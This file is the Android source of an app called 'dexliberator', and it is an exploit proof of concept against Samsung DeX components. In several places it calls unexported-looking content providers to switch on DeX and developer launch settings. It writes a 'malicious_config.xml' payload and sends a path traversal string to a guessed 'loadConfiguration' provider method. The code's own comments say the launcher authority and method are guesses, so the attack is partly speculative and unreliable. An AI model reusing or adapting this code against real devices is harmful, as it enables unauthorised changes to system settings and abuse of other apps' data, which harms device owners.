package com.example.dexliberator;

import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);

        // Existing button
        Button btnFire = new Button(this);
        btnFire.setText("FIRE EXPLOIT (Settings)");
        btnFire.setTextSize(18f);
        layout.addView(btnFire);

        // New button
        Button btnLauncher = new Button(this);
        btnLauncher.setText("FIRE LAUNCHER EXPLOIT");
        btnLauncher.setTextSize(18f);
        layout.addView(btnLauncher);

        setContentView(layout);

        btnFire.setOnClickListener(v -> {
            if (Settings.System.canWrite(this)) {
                fireExploit();
            } else {
                Toast.makeText(this, "Grant Permission First!", Toast.LENGTH_SHORT).show();
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });

        btnLauncher.setOnClickListener(v -> {
            setupMaliciousFile();
            fireLauncherExploit();
        });
    }

    private void fireExploit() {
        new Thread(() -> {
            try {
                ContentResolver resolver = getContentResolver();
                Uri providerUri = Uri.parse("content://com.sec.android.desktopmode.uiservice.SettingsProvider");

                Bundle p1 = new Bundle();
                p1.putString("key", "enable_dex_on_builtin_display");
                p1.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p1);

                Bundle p2 = new Bundle();
                p2.putString("key", "launch_policy_developer_enabled");
                p2.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p2);

                runOnUiThread(() -> Toast.makeText(this, "☢️ PAYLOAD DELIVERED ☢️", Toast.LENGTH_LONG).show());

            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "ERROR: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }).start();
    }

    private void setupMaliciousFile() {
        try {
            File file = new File(getFilesDir(), "malicious_config.xml");
            FileOutputStream fos = new FileOutputStream(file);
            String payload = "<configuration><allow_arbitrary_code>true</allow_arbitrary_code></configuration>";
            fos.write(payload.getBytes());
            fos.close();
            // Try to make it readable just in case
            file.setReadable(true, false);
        } catch (IOException e) {
            e.printStackTrace();
            runOnUiThread(() -> Toast.makeText(this, "Failed to create malicious file", Toast.LENGTH_SHORT).show());
        }
    }

    private void fireLauncherExploit() {
        new Thread(() -> {
            try {
                ContentResolver resolver = getContentResolver();
                // Authority guess for DeX Launcher
                Uri providerUri = Uri.parse("content://com.sec.android.app.desktoplauncher.settings");

                // Construct path traversal string
                // Assuming victim base dir is /data/user/0/com.sec.android.app.desktoplauncher/files/
                // We want to reach /data/user/0/com.example.dexliberator/files/malicious_config.xml
                String path = "../../../../data/data/" + getPackageName() + "/files/malicious_config.xml";

                // We assume the method is something like "loadConfiguration"
                Bundle extras = new Bundle();
                extras.putString("path", path); // Try passing as extra

                // Try passing as 'arg'
                resolver.call(providerUri, "loadConfiguration", path, extras);

                runOnUiThread(() -> Toast.makeText(this, "☢️ LAUNCHER PAYLOAD DELIVERED ☢️", Toast.LENGTH_LONG).show());

            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "LAUNCHER ERROR: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }).start();
    }
}
